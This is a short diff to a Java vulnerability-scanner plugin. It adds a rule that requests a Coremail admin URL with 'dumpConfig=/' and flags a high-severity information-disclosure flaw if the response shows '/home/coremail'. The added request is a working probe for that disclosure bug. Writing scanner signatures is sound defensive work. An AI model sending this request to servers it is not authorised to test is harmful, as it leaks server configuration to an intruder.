@@ -161,6 +161,16 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
                         ).build()
         );
 
+        loaders.add(Payloader.builder()
+                .url("/mailsms/s?func=ADMIN:appState&dumpConfig=/")
+                .containsStr("/home/coremail")
+                .vuln(Vulnerable.builder()
+                        .title("Coremail 信息泄露漏洞")
+                        .level(Vulnerable.Level.HIGH.getLevel())
+                        .type(Vulnerable.Type.INFO_LEAKAGE.getType())
+                        .build())
+                .build());
+
         loaders.add(
                 Payloader.builder().url("/WebResource.axd?d=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1")
                         .containsStr("Microsoft .NET Framework")
